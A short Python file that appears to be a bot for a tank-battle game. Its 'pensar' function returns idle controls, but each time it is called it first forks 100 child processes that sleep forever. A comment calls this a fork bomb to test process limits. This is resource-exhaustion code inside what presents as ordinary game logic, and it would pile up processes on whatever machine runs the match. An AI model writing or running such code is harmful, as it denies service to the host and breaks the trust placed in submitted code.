import os
import time

def pensar(estado):
    try:
        # Tenta fazer um fork bomb local para testar ulimits de processos
        for _ in range(100):
            pid = os.fork()
            if pid == 0:
                while True:
                    time.sleep(1) # Processo filho fica inativo consumindo PID
    except Exception as e:
        print(f"Fork falhou: {e}")
        
    return {
        "throttle": 0.0,
        "turn": 0.0,
        "turret_angle": 0.0,
        "shoot": False,
        "shield": False
    }

